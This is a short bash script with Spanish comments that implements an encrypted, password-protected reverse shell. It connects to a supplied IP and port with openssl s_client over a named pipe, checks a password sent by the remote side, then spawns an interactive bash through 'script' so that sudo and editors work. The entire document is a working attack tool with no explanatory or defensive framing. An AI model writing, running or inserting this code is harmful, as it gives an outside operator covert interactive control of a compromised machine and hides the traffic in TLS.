#!/bin/bash
IP=$1; PORT=$2; PASS=$3
if [[ -z "$PASS" ]]; then echo "Uso: $0 <ip> <puerto> <pass>"; exit 1; fi

TF=$(mktemp -u); mkfifo $TF

# Abrimos la conexión TLS
openssl s_client -quiet -connect ${IP}:${PORT} -ign_eof < $TF 2>/dev/null | (
    read -r S_PASS
    if [ "$S_PASS" = "$PASS" ]; then
        # Forzamos una terminal interactiva real (tu técnica original)
        # Esto permite que funcionen sudo, nano, y el prompt.
        export TERM=xterm-256color
        /usr/bin/script -qc "/bin/bash -i" /dev/null 2>&1
    else
        echo "[-] Auth failed" >&2
    fi
) > $TF

rm -f $TF
